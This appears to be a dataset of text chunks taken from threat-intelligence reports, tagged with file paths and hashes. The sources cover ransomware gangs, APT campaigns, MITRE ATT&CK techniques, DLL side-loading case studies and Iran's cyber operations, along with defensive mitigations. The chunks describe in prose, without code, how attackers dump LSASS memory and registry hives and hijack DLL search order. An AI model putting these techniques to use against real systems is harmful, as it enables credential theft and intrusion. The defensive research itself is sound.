White Paper Just two weeks later, Babuk released what it claimed was another 22 GB of data belonging to the police department following the breakdown of ransom negotiations. The gang published the data on its dedicated data leak website. According to reports, the Babuk operators were initially seeking a $4 million ransom. According to the screenshots posted by Babuk, the police department offered $100,000, but this wasn’t acceptable to the ransomware gang. The additional leaked data allegedly included arrest files, financial files, case files, disciplinary files, and more. A relatively new arrival to the ransomware scene, Babuk first appeared in January 2021. The ransomware gang targets victims in human-operated attacks. While Babuk initially used the strong Elliptic-curve Diffie–Hellman algorithm to encrypt files, the ransomware gang has since claimed that it will no longer be encrypting victims’ data and will instead solely focus on data theft and extortion. Ryuk and Conti In October 2020, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) issued a warning about an increase in Emotet attacks against state and local government organizations. The Emotet Trojan was originally designed to steal banking credentials from an infected computer and also add it to a botnet. However, Emotet developed into a major distribution channel for other malware families, including targeted ransomware threats such as Ryuk and Conti."|data_input/Oilrig_reports/entry_5c5721a1-bd1a-4fd4-b8f5-42f4a86136c2.text|b97c294eb8fa4c0eb71ebd7a24c32a86
Ryuk and Conti, along with the GoGalocker and MegaCortex ransomware families, are controlled by a single adversary that Symantec calls Miner. The ransomware threats operate on a ransomware-as-a-service (RaaS) business model, with the creators sharing the ransomware with affiliated attackers in exchange for a cut of the ransom. In all of Miner’s ransomware operations, the threat actors use Cobalt Strike, which runs in the memory of infected computers, making detection difficult. Cobalt Strike is used by Miner to download additional tools and to create a reverse shell providing the attackers with additional access. Miner was likely leasing access to Emotet from the botnet’s operators and using that access to target its victims with Ryuk. Ryuk was previously distributed by the Trickbot botnet. However, in early 2021, law enforcement agencies announced they had taken control of the Emotet botnet’s infrastructure, which they used to deliver an update that removed the malware from infected computers. This did not spell the end for Miner, though, which also relies on malicious spam campaigns, and compromising exposed RDP connections to gain access to victim networks, mounting brute force and password spraying attacks against RDP. In August 2020, Conti joined the list of targeted ransomware families to create a public data leak website in order to increase the pressure on victims to pay a ransom. Conti is believed to have strong links to Ryuk.|data_input/Oilrig_reports/entry_5c5721a1-bd1a-4fd4-b8f5-42f4a86136c2.text|c3e98fed766e491687b22017eab5f9d4
"While Ryuk was being distributed via the Trickbot botnet, in July 2020, the botnet stopped delivering Ryuk and begun delivering Conti instead. The Conti ransomware recently made headlines when it infected Ireland’s Health Service Executive (HSE), the country’s national health service, demanding a $20 million ransom for the return of stolen data.

Network-Based Activity Malware detections form only one part of the picture, and more information can be gleaned from attacks blocked on the network by our Intrusion Prevention (IPS) technologies. Malicious network-based activity reveals more information about the extent of malicious activity on organizations’ networks by blocking activity at the application layer. If a machine on a network becomes infected, the malware is likely to attempt to contact a command and control (C&C) server, which can also trigger these detections. Looking at the number of network detections attempting to contact a C&C server can give us a more realistic idea about how many infected machines are on a network and a truer picture of the extent of malicious activity in a sector.

When looking at the countries where the government sector is most frequently targeted by malware, the U.S. is the most represented, accounting for nearly a quarter of all malware detections. This is unsurprising, since the U.S. is a populous country, with multiple layers of government at both federal and state level.

"Attack Tactics, Techniques, and Procedures The MITRE ATT&CK® matrix classifies attack techniques and tactics. It divides attack tactics into the following 12 main categories, which map to the typical attack chain between vector and payload execution: • Initial Access • Execution • Persistence • Privilege Escalation • Defense Evasion • Credential Access • Discovery • Lateral Movement • Collection • Command and Control • Exfiltration • Impact Within these categories, there are 245 distinct attack techniques. Some may be employed at multiple stages of an attack chain, meaning they can apply to more than one of the above 12 categories. Symantec Cloud Analytics classifies all incidents with a MITRE technique name. With millions of incidents logged each year, it is possible to form a picture of the most frequently used techniques. Cloud Analytics draws on intelligence gathered from analyst investigations and leverages advanced machine learning to identify and block patterns of suspicious activity. Because it is designed to identify malicious activity, more so than malicious tools, the vast majority of incidents created relate to living-off-the-land tactics.

The following are some of the most common Mitre ATT&CK techniques used by threat actors targeting the government sector in 2020: • PowerShell: PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. It can be abused to perform a number of actions, including discovery of information and execution of code. • Obfuscated Files or Information: Attempting to make a malicious file difficult to discover by encoding it or otherwise obfuscating its contents. • Remote File Copy: Transferring tools or files from external sources onto a compromised network, either via download from a command and control (C&C) server or through other methods such as FTP. • Regsvr32: Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls. Attackers may abuse Regsvr32.exe for proxy execution of malicious code. • Credential Dumping: Obtaining credentials, either hashed or in clear text, usually through a dump of the computer’s memory. A range of freely available tools such as Mimikatz or LaZagne can be used to perform this task. • Modify Registry: Modifying the registry to hide configuration information within registry keys, or deleting information in order to remove evidence of intrusions. • Windows Management Instrumentation (WMI): Microsoft command-line tool, which can be used to execute commands on remote computers."|data_input/Oilrig_reports/entry_5c5721a1-bd1a-4fd4-b8f5-42f4a86136c2.text|167cf83e0a98476ab095e48975592e86
"Service Execution: The Windows service control manager (services.exe) is an interface to manage and manipulate services. It can be used to execute malicious commands or payloads. • Mshta: Mshta.exe is a Microsoft utility that executes HTML Application (HTA) files. Attackers may abuse mshta.exe for proxy execution of malicious .hta files and JavaScript or VBScript through a trusted Windows utility. • Masquerading: Manipulating files and tools in order to make them appear to be legitimate or benign in order to evade detection.

White Paper Case Studies The following two case studies are examples of some of the more recent investigations carried out by the Symantec Threat Hunter Team. The incidents, which both impacted organizations in the government sector, offer a snapshot into what these organizations are targeted by and highlight a small selection of the methods used by the attackers.

"Case Study 1 - Legitimate Executables Abused to Side-load Malicious DLLs In April 2021, Symantec technology identified a number of suspicious files on multiple computers on the networks of two government agencies, one in a Southeast Asian country and another in a country in South Asia. The investigation found that the attackers were abusing legitimate executables for side-loading malicious DLLs in order to execute a backdoor threat (RDoorBackdoor) on victim computers. The motive for the attacks appears to have been information gathering. In one case, the attackers appeared to be targeting information related to the Association of Southeast Asian Nations (ASEAN). RDoorBackdoor has been in use since at least 2018. It appears to be used in targeted attacks only but it is unclear if the backdoor is a shared tool or exclusive to one attack group. The attack activity discussed in this case occurred between June 2020 and April 2021. While the initial infection vector is unknown, the lead up to the final payload begins with RDoorDropper, a self-extracting (SFX) RAR file. RDoorDropper contains three files: • A legitimate and signed PE vulnerable to DLL search-order hijacking • A malicious loader (RDoorLoader) • An encrypted .pak file containing the final payload (RDoorBackdoor) We observed RDoorDropper variants abusing PEs for four different legitimate applications and a discontinued plug-in for Internet Explorer: Table 1: Legitimate PEs Abused by the Attackers

What is DLL search order hijacking? Dynamic link library (DLL) side-loading via search order hijacking is a cyber attack method that takes advantage of how Microsoft Windows programs handle DLL files. In DLL search order hijacking attacks, malware places a spoofed malicious DLL file in a specific Windows directory so that the operating system loads it instead of the legitimate file. Windows allows programs to load DLLs at runtime and programs can specify the location of DLLs to load by specifying a full path, using DLL redirection, or by using a manifest. If none of these methods are used, Windows tries to locate the DLL by searching a list of directories in a set order. Attackers abuse this search feature by placing a malicious DLL in one of those directories. Often this is the current working directory of the program. Then Windows finds and loads the malicious DLL before the legitimate version. It is also possible to execute code within the context of a legitimate portable executable (PE) by abusing insecure library references. If a developer allows LoadLibrary to resolve the path of a library dynamically then that PE will also look in the current directory for the library DLL. A threat actor can copy a legitimate PE to a directory where the attacker has write access. If the attacker creates a custom payload DLL, the program will load that DLL and execute the malicious code."|data_input/Oilrig_reports/entry_5c5721a1-bd1a-4fd4-b8f5-42f4a86136c2.text|0b36bb0333794e21aa5bfa6718073a5f
"This can be beneficial for the attacker as the PE may be signed and appear trustworthy to some security solutions, and it may also bypass application white listing (AWL).

Post compromise RDoorBackdoor RDoorBackdoor is a fully featured backdoor with the ability to install itself as a service, log keystrokes, communicate with its command and control server (C&C) using HTTP, HTTPS, DNS, UDP, or TCP, and listen on a local port for commands. Instances of RDoorBackdoor are usually identical with the exception of embedded and encrypted configuration which determines: • C&C communication method • Service details • Installation directory The attackers using RDoorBackdoor used a number of non-malware techniques for credential theft: • PowerShell was used to launch rundll32.exe in order to dump the memory of a process using the MiniDump function of comsvcs.dll (this is a technique used often to dump LSASS memory) • Reg.exe was used to dump the SAM and SYSTEM registry hives • A legitimate Avast tool was used by the attackers to dump LSASS memory Other post-compromise tools used by the attackers included: LSASS dumping tool • The only credential theft tool found to be uses by the attackers • Similar to how PowerShell is used, this tool can dump LSASS process memory using the legitimate comsvcs.dll file BrowsingHistoryView • A utility that reads the history data of different web browsers

White Paper

Case Study 2 - Early Access to Unpatched Microsoft Exchange Server Vulnerabilities Snail (aka Calypso) are believed to be in operation since 2016. First publicized in October 2019, the group is believed to be of Asian origin and is involved in espionage-type operations on a global scale. Snail are known to exploit publicly facing applications to install their malware. The group can be identified by the use of a custom malware called Calypso RAT (Trojan.Calypso). The group has been observed targeting organizations in various sectors including the government, as well as electronics, IT, and transport. Once they have compromised a network, Snail are known to deploy web shells and the custom Calypso RAT malware. Additionally, Snail have reportedly leveraged open-source tools such as network and port scanners and tunneling tools. The group has also leveraged exploit tools such as EternalBlue, DoublePulsar, and EternalRomance. Organizations in the following regions have been targeted by Snail: • Afghanistan • China • India • Japan • South Korea • U.S. Snail are known to target public-facing applications in order to initially compromise victims. In 2020, Snail reportedly had early access to an unpatched Microsoft Exchange Server vulnerability chain (ProxyLogon) in order to deploy their malware."|data_input/Oilrig_reports/entry_5c5721a1-bd1a-4fd4-b8f5-42f4a86136c2.text|da11ced85a3c4d4491d151cab7b3b758
"ProxyLogon is a pre-authentication remote code execution (RCE) vulnerability chain (CVE-2021-26855, CVE2021-26857, CVE-2021-26858, and CVE-2021-27065) that can allow an attacker to take over any reachable Exchange server, without the need for valid account credentials. Before Microsoft released out-of-band patches for vulnerable versions of Exchange server on March 2, 2021, a number of APT groups, which included Snail, had already been exploiting ProxyLogon in the wild. This means that the threat groups did not reverse engineer the Microsoft updates, as is often the case. However, it is unclear how the groups gained access to the details of the vulnerabilities before the release of the patches. On March 1, 2020, a full day before Microsoft released patches, Snail used the ProxyLogon vulnerabilities to compromise the email servers of government entities in the Middle East and in South America. In the following days, the group used the exploit to target additional servers of government entities and private companies in Africa, Asia, and Europe. The group deployed a web shell, the Calypso RAT malware, and a custom backdoor. The malicious tools are loaded using DLL search-order hijacking (see Case Study 1) against legitimate executables also dropped by the group.

White Paper Mitigation Symantec security experts recommend users observe the following best practices to protect against targeted attacks. Local Environment: • Monitor the use of dual-use tools inside your network. • Ensure you have the latest version of PowerShell and you have logging enabled. • Restrict access to RDP Services. Only allow RDP from specific known IP addresses and ensure you are using multi-factor authentication (MFA). • Implement proper audit and control of administrative account usage. You could also implement one-time credentials for administrative work to help prevent theft and misuse of admin credentials. • Create profiles of usage for admin tools. Many of these tools are used by attackers to move laterally undetected through a network. • Use application allow lists where applicable. • Locking down PowerShell can increase security, for example with the constrained language mode. • Make credential dumping more difficult, for example by enabling credential guard in Windows 10 or disabling SeDebugPrivilege. • MFA can help limit the usefulness of compromised credentials. Email: • Enable MFA to prevent the compromise of credentials during phishing attacks. • Harden security architecture around email systems to minimize the amount of spam that reaches end-user inboxes and ensure you are following best practices for your email system, including the use of SPF and other defensive measures against phishing attacks."|data_input/Oilrig_reports/entry_5c5721a1-bd1a-4fd4-b8f5-42f4a86136c2.text|ced55ccabb2b42278fc945b0c803dede

Attacks Against the Government Sector

White Paper Appendix B: DLL Search Order Hijacking Mitigation The MITRE ATT&CK® matrix lists the following mitigations for preventing DLL side-loading attacks:"|data_input/Oilrig_reports/entry_5c5721a1-bd1a-4fd4-b8f5-42f4a86136c2.text|b07dbaa4af984b0c92616e1a28a092b3
"M1047 Audit Use auditing tools capable of detecting DLL search order hijacking opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for DLL hijacking weaknesses. Use the program sxstrace.exe that is included with Windows along with manual inspection to check manifest files for side-by-side problems in software.

M1038 Execution Prevention Adversaries may use new DLLs to execute this technique. Identify and block potentially malicious software executed through search order hijacking by using application control solutions capable of blocking DLLs loaded by legitimate software.

M1044 Restrict Library Loading Disallow loading of remote DLLs. This is included by default in Windows Server 2012+ and is available by patch for XP+ and Server 2003+. Enable Safe DLL Search Mode to force search for system DLLs in directories with greater restrictions (e.g. %SYSTEMROOT%)to be used before local directory DLLs (e.g. a user’s home directory). The Safe DLL Search Mode can be enabled via Group Policy at Computer Configuration > [Policies] > Administrative Templates > MSS (Legacy): MSS: (SafeDllSearchMode) Enable Safe DLL search mode. The associated Windows Registry key for this is located at HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\SafeDLLSearchMode"|data_input/Oilrig_reports/entry_5c5721a1-bd1a-4fd4-b8f5-42f4a86136c2.text|2e3018699ec44fa0af7319a79702c8cb
"Detection Monitor file systems for moving, renaming, replacing, or modifying DLLs.

"APT Trends Report Q2 2018 securelist.com/apt-trends-report-q2-2018/86487 By GReAT

In the second quarter of 2017, Kaspersky Lab’s Global Research and Analysis Team (GReAT) began publishing summaries of the quarter’s private threat intelligence reports, in an effort to make the public aware of the research we have been conducting. This report serves as the latest installment, focusing on the relevant activities that we observed during Q2 2018. These summaries are a representative snapshot of what has been discussed in greater detail in our private reports. They aim to highlight the significant events and findings that we feel people should be aware of. For brevity’s sake, we are choosing not to publish indicators associated with the reports highlighted. However, readers who would like to learn more about our intelligence reports or request more information on a specific report are encouraged to contact: intelreports@kaspersky.com."|data_input/Oilrig_reports/entry_6ca66150-5a9c-4737-959a-8264159df7e7.text|b42549f8c437429a996624315982086a
"Remarkable new findings We are always interested in analyzing new techniques used by existing groups, or in finding new clusters of activity that might lead us to discover new actors. Q2 2018 was very interesting in terms of APT activity, with a remarkable campaign that reminds us how real some of the threats are that we have been predicting over the last few years. In particular, we have warned repeatedly how ideal networking hardware was for targeted attacks, and that we had started seeing the first advanced sets of activity focusing on these devices. In terms of well-known groups, Asian actors were the most active by far. Lazarus/BlueNoroff was suspected of targeting financial institutions in Turkey as part of a bigger cyberespionage campaign. The same actor was also suspected of a campaign against an online casino in Latin America that ended in a destructive attack. Based on our telemetry, we further observed Lazarus targeting financial institutions in Asia. Lazarus has accumulated a large collection of artefacts over the last few years, in some cases with heavy code reuse, which makes it possible to link many newly found sets of activity to this actor. One such tool is the Manuscrypt malware, used exclusively by Lazarus in many recent attacks. The US-CERT released a warning in June about a new version of Manuscrypt they call TYPEFRAME.

US-CERT alert on Manuscrypt/TYPEFRAME malware used by Lazarus

Even if it is unclear what the role of Lazarus will be in the new geopolitical landscape, where North Korea is actively engaged in peace talks, it would appear that financially motivated activity (through the BlueNoroff and, in some cases, the Andariel subgroup) continues unabated. Possibly even more interesting is the relatively intense activity by Scarcruft, also known as Group123 and Reaper. Back in January, Scarcruft was found using a zero-day exploit, CVE2018-4878 to target South Korea, a sign that the group’s capabilities were increasing. In the last few months, the use of Android malware by this actor has been discovered, as well as a new campaign where it spreads a new backdoor we call POORWEB. Initially, there was suspicion that Scarcruft was also behind the CVE-2018-8174 zero day announced by Qihoo360. We were later able to confirm the zero day was actually distributed by a different APT group, known as DarkHotel. The overlaps between Scarcruft and Darkhotel go back to 2016 when we discovered Operation Daybreak and Operation Erebus. In both cases, attacks leveraged the same hacked website to distribute exploits, one of which was a zero day. We were later able to separate these as follows:

DarkHotel’s Operation Daybreak relied on spear-phishing emails predominantly targeting Chinese victims with a Flash Player zero day. Meanwhile, Scarcruft’s Operation Erebus focused primarily on South Korea."|data_input/Oilrig_reports/entry_6ca66150-5a9c-4737-959a-8264159df7e7.text|4f88c38e455f4c4d9e831dab1d29ea0d
"Analysis of the CVE-2018-8174 exploit used by DarkHotel revealed that the attacker was using URLMoniker to invoke Internet Explorer through Microsoft Word, ignoring any default browser preferences on the victim’s computer. This is the first time we have observed this. It is an interesting technique that we believe may be reused in future for different attacks. For more details check our Securelist Blog: “The King is Dead. Long Live the King!“. We also observed some relatively quiet groups coming back with new activity. A noteworthy example is LuckyMouse (also known as APT27 and Emissary Panda), which abused ISPs in Asia for waterhole attacks on high profile websites. We wrote about LuckyMouse targeting national data centers in June. We also discovered that LuckyMouse unleashed a new wave of activity targeting Asian governmental organizations just around the time they had gathered for a summit in China. Still, the most notable activity during this quarter is the VPNFilter campaign attributed by the FBI to the Sofacy and Sandworm (Black Energy) APT groups. The campaign targeted a large array of domestic networking hardware and storage solutions. It is even able to inject malware into traffic in order to infect computers behind the infected networking device. We have provided an analysis on the EXIF to C2 mechanism used by this malware.

"3/6

This campaign is one of the most relevant examples we have seen of how networking hardware has become a priority for sophisticated attackers. The data provided by our colleagues at Cisco Talos indicates this campaign was at a truly global level. We can confirm with our own analysis that traces of this campaign can be found in almost every country.

Activity of well-known groups It seems that some of the most active groups from the last few years have reduced their activity, although this does not mean they are less dangerous. For instance, it was publicly reported that Sofacy started using new, freely available modules as last stagers for some victims. However, we observed how this provided yet another innovation for their arsenal, with the addition of new downloaders written in the Go programming language to distribute Zebrocy. There is possibly one notable exception to this supposed lack of activity. After the Olympic Destroyer campaign last January against the Pyeongchang Winter Olympic games, we observed new suspected activity by the same actor (we tentatively called them Hades) in Europe. This time, it seems the targets are financial organizations in Russia, and biological and chemical threat prevention laboratories in Europe and Ukraine."|data_input/Oilrig_reports/entry_6ca66150-5a9c-4737-959a-8264159df7e7.text|e1b71ec91c204430a9cb3dbb6c82d253
"But even more interesting is the resemblance between the TTPs and OPSEC of the Olympic Destroyer set of activity and those of Sofacy. Olympic Destroyer is a master of deception, so this may be yet another false flag, but so far we connect, with low to medium confidence, 4/6

the Hades group activity to Sofacy. One of the most interesting attacks we detected was an implant from Turla (attributed to this actor with medium confidence) that we call LightNeuron. This new artefact directly targets Exchange Servers and uses legitimate standard calls to intercept emails, exfiltrate data and even send mails on behalf of the victims. We believe this actor has been using this technique since maybe as early as 2014, and that there is a version affecting Unix servers running Postfix and Sendmail. So far we have seen victims of this implant in the Middle East and Central Asia."|data_input/Oilrig_reports/entry_6ca66150-5a9c-4737-959a-8264159df7e7.text|03c4dd78b56b4b0a863c9273947b118a
Newcomers and comebacks Every now and then, we are surprised to see old actors that have been dormant for months or even years distributing new malware. Obviously, this may be caused by a lack of visibility, but regardless of that, it indicates that these actors are still active. One good example would be WhiteWhale, an actor that has been extremely quiet since 2016. We detected a new campaign last April where the actor was distributing both the Taidoor and Yalink malware families. This activity was almost exclusively targeting Japanese entities. Following the intense diplomatic activity around the North Korea peace talks and the subsequent summit with the U.S. president in Singapore, Kimsuky decided to take advantage of this theme to distribute its malware in a new campaign. A massive update to its arsenal in late 2017 and early 2018 was mobilized in a new wave of spear-phishing emails. We also discovered a new low-sophistication set of activity we call Perfanly, which we couldn ´t attribute to any known actor. It has been targeting governmental entities in Malaysia and Indonesia since at least 2017. It uses custom multistage droppers as well as freely available tools such as Metasploit. Between June and July, we observed a battery of attacks against various institutions in Kuwait. These attacks leverage Microsoft Office documents with macros, which drop a combination of VBS and Powershell scripts using DNS for command and control.|data_input/Oilrig_reports/entry_6ca66150-5a9c-4737-959a-8264159df7e7.text|af5387b5bfc14c2a80a5c5c731f1b931
"We have observed similar activity in the past from groups such as Oilrig and Stonedrill, which leads us to believe the new attacks could be connected, though for now that connection is only assessed as low confidence.

Final thoughts

"5/6

The combination of simple custom artefacts designed mainly to evade detection, with publicly available tools for later stages seems to be a well-established trend for certain sets of activity, like the ones found under the ‘Chinese-speaking umbrella’, as well as for many newcomers who find the entry barrier into APT cyberespionage activity non-existent. The intermittent activity by many actors simply indicates they were never out of business. They might take small breaks to reorganize themselves, or to perform small operations that might go undetected on a global scale. Probably one of the most interesting cases is LuckyMouse, with aggressive new activity heavily related to the geopolitical agenda in Asia. It is impossible to know if there is any coordination with other actors who resurfaced in the region, but this is a possibility. One interesting aspect is the high level of activity by Chinese-speaking actors against Mongolian entities over the last 10 months. This might be related to several summits between Asian countries – some related to new relations with North Korea – held in Mongolia, and to the country’s new role in the region. There were also several alerts from NCSC and US CERT regarding Energetic Bear/Crouching Yeti activity. Even if it is not very clear how active this actor might be at the moment (the alerts basically warned about past incidents), it should be considered a dangerous, active and pragmatic actor very focused on certain industries."|data_input/Oilrig_reports/entry_6ca66150-5a9c-4737-959a-8264159df7e7.text|06e8a636311d40c095a02dcce48ee7ce
"We recommend checking our latest analysis on Securelist because the way this actor uses hacked infrastructure can create a lot of collateral victims. To recap, we would like to emphasize just how important networking hardware has become for advanced attackers. We have seen various examples during recent months and VPNFilter should be a wake-up call for those who didn’t believe this was an important issue. We will continue to track all the APT activity we can find and will regularly highlight the more interesting findings, but if you want to know more, please reach out to us at intelreports@kasperksy.com.

SUMMARY

Incidents involving Iran have been among the most sophisticated, costly, and consequential attacks in the history of the internet. The four-decade-long U.S.-Iran cold war has increasingly moved into cyberspace, and Tehran has been among the leading targets of uniquely invasive and destructive cyber operations by the United States and its allies. At the same time, Tehran has become increasingly adept at conducting cyber espionage and disruptive attacks against opponents at home and abroad, ranging from Iranian civil society organizations to governmental and commercial institutions in Israel, Saudi Arabia, and the United States.

IRAN’S CYBER THREAT ENVIRONMENT"|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|4aeb6d796fbb4adabc5aad39a7d9b775
"IRAN’S CYBER THREAT ENVIRONMENT

Offensive cyber operations have become a core tool of Iranian statecraft, providing Tehran less risky opportunities to gather information and retaliate against perceived enemies at home and abroad.

Just as Iran uses proxies to project its regional power, Tehran often masks its cyber operations using proxies to maintain plausible deniability. Yet there are clear indications that such operations are conducted by Iranians and frequently can be linked to the country’s security apparatus, namely the Ministry of Intelligence and Islamic Revolutionary Guard Corps.

1

Iran’s cyber capabilities appear to be indigenously developed, arising from local universities and hacking communities. This ecosystem is unique, involving diverse state-aligned operators with differing capabilities and affiliations. Over the decade that Iranians have been engaged in cyber operations, threat actors seemingly arise from nowhere and operate in a dedicated manner until their campaigns dissipate, often due to their discovery by researchers."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|29af520535834d0193fe5efc243d37f5
"Though Iran is generally perceived as a third-tier cyber power—lacking the capabilities of China, Russia, and the United States—it has effectively exploited the lack of preparedness of targets inside and outside Iran. Just as Russia’s compromise of Democratic Party institutions during the 2016 U.S. presidential election demonstrated that information warfare can be conducted through basic tactics, Iran’s simple means have exacted sometimes enormous political and financial costs on unsuspecting adversaries.

The same Iranian actors responsible for espionage against the private sector also conduct surveillance of human rights defenders. These attacks on Iranian civil society often foreshadow the tactics and tools that will be employed against other targets and better describe the risks posed by Iranian cyberwarfare.

Through technical forensics of cyber attacks, researchers documenting these campaigns can provide a unique window into the worldview and capabilities of Iran’s security services and how it responds to a rapidly changing technological and geopolitical environment.

U.S. RESPONSES GOING FORWARD"|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|6da0703032c148fc8f7597672c175180
"U.S. RESPONSES GOING FORWARD

While Iran does not have a public strategic policy with respect to cyberspace, its history demonstrates a rationale for when and why it will engage in attacks. Iran uses its capabilities in response to domestic and international events. As conflict between Tehran and Washington subsided after the 2015 nuclear deal, so too did the cycle of disruptive attacks. However, Iran’s decisionmaking process is obscured and its cyber capabilities are not controlled by the presidency, as evident in cases of intragovernmental hacking.

The United States is reliant on an inadequately guarded cyberspace and should anticipate that future conflicts, online or offline, could trigger cyber attacks on U.S. infrastructure. The first priority should be to extend efforts to protect infrastructure and the public, including increased collaboration with regional partners and nongovernmental organizations targeted by Iran.

IRAN’S CYBER THREAT

Narrowly targeted sanctions could be used to deter foreign countries or other actors from providing assistance to Iranian offensive cyber operations. Such restrictions should still prioritize allowing Iranian society wide access to the internet and information technologies, to mitigate the regime’s ability to control information and communications."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|ff6078d069214354a27d7da48f0f918a
"The United States has pursued a name and shame strategy against Iranian threat actors, and should continue to do so. The Justice Department has issued indictments against Iranians implicated in disruptive campaigns and has successfully obtained the extradition from a third country of a hacker involved in the theft of military secrets. Because of the small operational footprint of the groups, targeted sanctions or legal proceedings are more symbolic than disruptive. These indictments may at least chill participation by talented individuals who wish to travel or emigrate.

Iran continues to pursue its interests through cyber operations, engaging in attacks against its regional opponents and espionage against other foreign governments. A better understanding of the history and strategic rationale of Iran’s cyber activities is critical to assessing Washington’s broader cyberwarfare posture against adversaries, and prudent U.S. responses to future cyber threats from Iran and elsewhere.

INTRODUCTION

Cyberspace has become the newest frontier in the four-decade-long U.S.-Iran cold war. Perhaps more than any government in the world, the Islamic Republic of Iran has been the target of uniquely destructive cyber attacks by the United States and its allies. At the same time, groups associated with Iran’s security forces—namely the Islamic Revolutionary Guard Corps (IRGC) and Ministry of Intelligence—have become increasingly adept at conducting their own offensive cyber operations. The targets of such operations include Iranian government critics at home and abroad, corporations, and nongovernmental organizations, as well as the economic, defense, and diplomatic institutions of countries including Germany, Israel, Saudi Arabia, and the United States. The Iranian government has provided conflicting public accounts of its offensive cyber operations, touting its capabilities while denying responsibility for attacks attributed to it. Consistent with its use of proxy groups to assert its regional power, Tehran frequently masks its involvement in such operations using cutouts (intermediaries) to avoid attribution and provide it plausible deniability. Despite these denials, it is clear Iran has invested in indigenous cyber capabilities for both defensive and offensive purposes, and is willing to use them in the event of conflict. Tehran’s offensive cyber capabilities are relatively unsophisticated compared to states like China, Russia, and the United States."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|6a59994d547246848d43cb3ca3cdcaca
"While the Iranian hacking scene emerged in the early 2000s, there is little evidence of state-aligned cyber activities before 2007. This comparatively late start and underinvestment in part accounts for its lower capacity. Yet Moscow’s compromise of Democratic Party institutions and political operatives during the 2016 U.S.

election demonstrated that information warfare can be conducted through basic tactics. Iran has similarly preyed upon the lack of sophistication or preparedness of vulnerable targets both inside and outside Iran, including Saudi oil companies, Middle Eastern governments, and U.S. banks. Though these operations have often caused great financial damage, the methods used to destroy data or disrupt access were relatively simple. Iran has demonstrated how militarily weaker countries can use offensive cyber operations to contend with more advanced adversaries. Tehran’s operations against foreign interests have been mostly espionage and sabotage campaigns against soft targets in rival countries, rather than economic theft. Disruptive and destructive attacks have repeatedly been used by Tehran to signal its ability to impose retaliatory costs on its adversaries. Overall, these disruptive incidents appear to have been Iran has demonstrated how restrained based on strategic calculations, and militarily weaker countries limited to tit-for-tat exchanges within the can use offensive cyber same domain during times of conflict.

more advanced adversaries.

That said, most victims of Iranian cyber operations are in Iran or the large Iranian diaspora—the so-called internal enemies that Tehran’s leadership fears. The early and effective adoption of the internet and social media by regime opponents and critics has fed the perception of Tehran’s hardliners that foreign powers are conspiring to subvert the Islamic Republic through new technologies. But the targets of Tehran’s digital surveillance include not only human rights defenders and perceived enemies of the state but also apolitical cultural institutions and even Iranian government agencies. Digital espionage and disruptive attacks against government critics have demonstrated to the Iranian public that its online activities are not outside the reach of the state. This report provides a historical analysis of the activities and observed capabilities of Iranian threat actors who perform offensive cyber operations, most likely on behalf of the Islamic Republic. For purposes of maintaining a consistent terminology, the cyber activities covered in this report are framed in terms of “offensive cyber operations,” which in the U.S. Department of Defense’s words are actions “intended to project power by the application of force in or through cyberspace,”1 or through distinguishing the intended effects (such as disruption, exfiltration, or destruction)."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|c8d8ffb42f9c402d98ad81ead9868493

although groups can have a single member and their composition can change over time. The terms “state-sponsored” or “state-aligned” are used throughout this report to reflect the direct relationship between the attackers and the Iranian government that is accounted for throughout the operations.2 Forensic artifacts and other records collected from cybersecurity research provide unprecedented insight into the security and intelligence priorities of the Iranian regime. The true intent of an attacker is not always evident in an intrusion. The compromise of a system for espionage or reconnaissance can later provide an electronic foothold used for sabotage. While Tehran has conducted highly visible attacks against rivals during times of conflict, the decade-long history of Iranian cyber operations reveals that the primary reason for such campaigns appears to be espionage. Iran has been the target of espionage and destructive coercive measures launched by foreign states, including not only the United States and Israel but also Canada, France, Russia, and the UK. These attacks further motivated Tehran to develop indigenous defensive and offensive cyber capabilities as well as a credible retaliatory threat. These exchanges are directly correlated to Iran’s domestic and geopolitical climate, which has been reflected in the reduction of disruptive attacks since the signing of the 2015 nuclear deal, formally known as the Joint Comprehensive Plan of Action (JCPOA)."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|3867d54ae89143c1959a66368f5ce838

Interviews with cybersecurity professionals similarly provide background on larger industry trends. The intent of this report is to strengthen policy discussions of Iran’s cyber operations by increasing public knowledge about the nature of such activities. Since cybersecurity research is typically limited to disclosures of specific threat actors or incidents, such publications do not provide insight into larger motivations and observable trends. This report differs in that it considers the historical patterns and the broader context of Iranian cyber operations, particularly their relationship to changing political conditions. It also emphasizes the overlap between Iranian campaigns conducted against foreign government institutions and/or corporate entities and those directed against human rights and civil society organizations, commonly neglected stakeholders in cybersecurity policy debates.

IRAN’S CYBER THREAT

CHAPTER ONE

IRAN: TARGET AND PERPETRATOR

Since the first publications on Iranian cyber activities in the summer of 2012—disclosing a malware agent named Madi—cybersecurity companies and Western government agencies have routinely documented intrusions, disruptions, and other malicious activities originating from Iran.4 Yet aside from attacks that sought to subvert foreign infrastructure, these reports have rarely provided context about Tehran’s offensive cyber operations and the motivations for attacks. Tehran’s perspective is shaped by the many attacks that have targeted its own infrastructure. Since Iran’s covert nuclear facilities were exposed by an opposition group in 2002, numerous foreign actors have staged intrusion operations that sought to gain access to Iran’s nuclear facilities, economic infrastructure, military apparatus, and governmental institutions, for both espionage and sabotage.5 Indeed, the most prominent example of modern cyberwarfare was the sustained campaign of sabotage—unprecedented in its sophistication and preparation—carried out by the United States and Israel against Iran’s nuclear facilities. In what was known as Operation Olympic Games, the malware agent Stuxnet was used to sabotage components of the Natanz uranium enrichment facility, resulting in the destruction of over 1,000 centrifuges and setting back Iran’s nuclear progress by more than a 